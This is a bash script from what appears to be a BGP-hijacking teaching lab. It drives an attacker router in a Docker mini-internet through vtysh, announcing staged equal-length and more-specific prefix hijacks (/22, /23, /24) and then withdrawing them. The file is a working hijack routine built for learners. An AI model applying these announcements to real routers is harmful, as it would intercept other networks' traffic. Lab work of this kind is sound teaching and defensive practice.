#!/usr/bin/env bash
# The attacker's control-plane action, run against the AS6 router over vtysh. This
# is the scripted equivalent of the vtysh commands the handout has the learner type
# by hand; like the other labs' baked tools it takes NO defaults -- the stage names
# the exact prefixes being announced. Modelled on the mini-internet's own hijack
# engine (platform/utils/hijacks/hijack.sh): announce the target prefix, backed by
# a discard route so origination is stable.
#
# Usage: hijack.sh <equal|sub23|sub24|clear>
#   equal  announce 1.0.0.0/22             -- same size as the victim's aggregate;
#                                             wins only where AS6 is the closer AS
#   sub23  announce 1.0.0.0/23             -- one level more specific; longest-match
#                                             beats the victim's /22 everywhere
#   sub24  announce 1.0.0.0/24, 1.0.1.0/24 -- at the /24 floor, after the victim
#                                             has answered with /23s
#   clear  withdraw everything             -- back to the pre-attack baseline
#
# Each stage REPLACES the previous one: the attacker announces exactly the set its
# stage names, so the table the learner reads is never a mix of two stages.
set -euo pipefail
source "$( dirname "${BASH_SOURCE[0]}" )/lib.sh"

R6="$( router_ctn "$ATTACKER_AS" )"
STAGE="${1:-}"

vt() { docker exec "$R6" vtysh "$@"; }

# Every prefix this script can ever announce, so a stage change or a clear removes
# whatever the previous stage left behind.
ALL_HIJACKS=( "$HIJACK_EQUAL" "$HIJACK_SUB23" "${HIJACK_SUB24[@]}" )

# `no network` on a prefix that is not currently announced is an error, and vtysh
# ABANDONS the remaining -c commands after any one of them errors. So each removal
# is its own guarded invocation; a single multi-command call would silently skip
# every withdrawal after the first prefix that happened not to be announced.
withdraw_all() {
    local p
    for p in "${ALL_HIJACKS[@]}"; do
        vt -c "conf t" -c "router bgp ${ATTACKER_AS}" -c "address-family ipv4 unicast" \
           -c "no network ${p}" >/dev/null 2>&1 || true
    done
    for p in "${ALL_HIJACKS[@]}"; do
        vt -c "conf t" -c "no ip route ${p} Null0" >/dev/null 2>&1 || true
    done
}

# Announce one prefix, with the discard route that makes `network` originate it
# regardless of what else is in the RIB. Traffic that arrives still matches the
# attacker's connected 1.0.0.0/25 first, so the impostor answers rather than the
# packet being dropped: this intercepts, it does not black-hole.
announce() {
    local p="$1"
    vt -c "conf t" -c "ip route ${p} Null0"
    vt -c "conf t" -c "router bgp ${ATTACKER_AS}" -c "address-family ipv4 unicast" \
       -c "network ${p}"
}

case "$STAGE" in
  equal)
    withdraw_all
    announce "$HIJACK_EQUAL"
    echo "[hijack] AS${ATTACKER_AS} now originates ${HIJACK_EQUAL} (same size as the victim's aggregate)."
    echo "[hijack] Expect only AS${ATTACKER_UPSTREAM_AS} to flip: it is the AS closer to AS${ATTACKER_AS} than to AS${VICTIM_AS}."
    ;;
  sub23)
    withdraw_all
    announce "$HIJACK_SUB23"
    echo "[hijack] AS${ATTACKER_AS} now originates ${HIJACK_SUB23} (more specific than the victim's /22)."
    echo "[hijack] Expect every AS that hears it to flip, whatever its AS-path length."
    ;;
  sub24)
    withdraw_all
    for p in "${HIJACK_SUB24[@]}"; do announce "$p"; done
    echo "[hijack] AS${ATTACKER_AS} now originates ${HIJACK_SUB24[*]} (the /24 floor)."
    echo "[hijack] Expect it to beat the victim's /23s everywhere by longest-prefix match."
    ;;
  clear)
    withdraw_all
    echo "[hijack] withdrawn; AS${ATTACKER_AS} back to announcing only its own ${ATTACKER_AS}.0.0.0/24."
    ;;
  *)
    echo "usage: hijack.sh <equal|sub23|sub24|clear>" >&2
    exit 1
    ;;
esac
